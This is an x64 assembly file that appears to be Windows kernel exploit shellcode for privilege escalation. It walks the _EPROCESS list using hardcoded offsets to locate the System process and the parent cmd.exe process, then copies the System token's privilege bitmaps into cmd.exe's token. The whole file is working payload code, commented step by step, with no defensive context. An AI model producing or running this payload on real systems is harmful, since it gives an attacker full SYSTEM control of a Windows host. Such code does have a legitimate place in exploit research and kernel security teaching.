BITS 64
section .text

	nop

	mov r8, qword [gs:0x188]
	mov r8, qword [r8 + 0x220]
	mov r10, r8											; get two _EPROCESS' start addresses (one for cmd and the other for system)
	mov r9, qword [r8 + 0x540]							; get the cmd.exe PID (InheritedFromUniqueProcessId)
	
	GetSystemLoop:
		mov r10, qword [r10 + 0x448]					; go to the flink
		sub r10, 0x448									; go to the _EPROCESS' startpoint
		cmp qword [r10 + 0x440], 0x04					; compare the UniqueProcessId with 4 (system PID)
		jne GetSystemLoop

	mov r10, [r10 + 0x4b8]								; get the system process _TOKEN structure
	and r10, 0xfffffffffffffff0							; get the pointer to the object and not to the fast reference pointer

	GetCmdLoop:
		mov r8, qword [r8+0x448]						; go to the flink
		sub r8, 0x448									; go to the _EPROCESS' startpoint
		cmp qword [r8 + 0x440], r9						; compare the UniqueProcessId cmd.exe's PID
		jne GetCmdLoop

	mov r8, [r8 + 0x4b8]								; get the system process _TOKEN structure
	and r8, 0xfffffffffffffff0							; get the pointer to the object and not to the fast reference pointer

	mov r9, qword [r10 + 0x40]			; move the Present parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x40], r9
	mov r9, qword [r10 + 0x48]			; move the Enabled parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x48], r9
	mov r9, qword [r10 + 0x50]			; move the EnabledByDefault parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x50], r9

	ret

end